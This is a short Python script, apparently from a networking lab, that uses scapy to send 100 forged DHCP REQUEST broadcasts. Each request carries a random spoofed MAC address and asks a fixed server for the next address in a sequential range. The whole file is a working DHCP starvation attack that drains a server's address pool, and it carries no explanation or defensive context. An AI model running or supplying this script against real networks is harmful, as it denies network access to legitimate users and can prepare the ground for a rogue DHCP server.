from scapy.all import *
import random

def random_mac():
    return "%02x:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for a in range(6))

iface = "enp0s3"
start_ip = "10.1.10.10"
nb_tentatives = 100

a, b, c, d = start_ip.split(".")
d = int(d)

for i in range(nb_tentatives):
    ip = f"{a}.{b}.{c}.{d + i}"
    mac = random_mac()
    ip_serv="10.1.30.1"

    print(f"MAC:{mac} IP:{ip}")
    pkt = (
        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff", type=0x0800) /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=mac2str(mac),
                xid=random.randint(1, 1000000000))/
        DHCP(options=[
            ("message-type", "request"),
            ("server_id", ip_serv),
            ("requested_addr", ip),
            "end"
        ])
    )

    sendp(pkt, iface=iface)